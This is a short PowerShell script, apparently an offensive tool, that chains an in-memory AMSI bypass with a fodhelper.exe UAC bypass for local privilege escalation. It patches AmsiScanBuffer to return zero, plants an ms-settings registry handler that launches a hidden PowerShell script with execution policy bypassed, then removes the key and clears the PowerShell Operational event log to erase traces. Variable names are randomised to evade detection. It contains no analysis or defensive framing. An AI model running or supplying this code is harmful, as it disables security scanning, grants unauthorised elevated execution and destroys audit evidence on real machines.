# LPE abusing fodhelper.exe

# amsi bypass
$64d1eab2022445c8add9ddb98b4b3f3d = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type -TypeDefinition $64d1eab2022445c8add9ddb98b4b3f3d -Language CSharp

$6abfe0e4869b46159cebdc75d97b094b = [Win32]::LoadLibrary("amsi.dll")
$cc145a30c76d4f6b892c6df7a1df7429 = [Win32]::GetProcAddress($6abfe0e4869b46159cebdc75d97b094b, "AmsiScanBuffer")

$7859efa123b54e78ac59f7dd2d03d18f = 0
[Win32]::VirtualProtect($cc145a30c76d4f6b892c6df7a1df7429, [UIntPtr]::new(6), 0x40, [ref]$7859efa123b54e78ac59f7dd2d03d18f)

$de2316b8afef4af3aca39b4bdc42f0c7 = [Byte[]](0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($de2316b8afef4af3aca39b4bdc42f0c7, 0, $cc145a30c76d4f6b892c6df7a1df7429, 3)
# reg key obfuscation
$e1651213d74c48c7b9485b28c9862b73 = "HKCU:\Software\Classes\{0}\shell\open\command" -f ('ms-settings')
$c0cb8019ac3f4037b4759730b58ea6ee = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1" 

New-Item $e1651213d74c48c7b9485b28c9862b73 -Force | Out-Null
Set-ItemProperty $e1651213d74c48c7b9485b28c9862b73 -Name "DelegateExecute" -Value ""
Set-ItemProperty $e1651213d74c48c7b9485b28c9862b73 -Name "(Default)" -Value $c0cb8019ac3f4037b4759730b58ea6ee

# fodhelper exploit with no detection (i think so)
Start-Process "cmd.exe" -ArgumentList "/c start fodhelper.exe" -WindowStyle Hidden


Start-Sleep 3
Remove-Item $e1651213d74c48c7b9485b28c9862b73 -Force -Recurse -ErrorAction SilentlyContinue

# hide logs
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
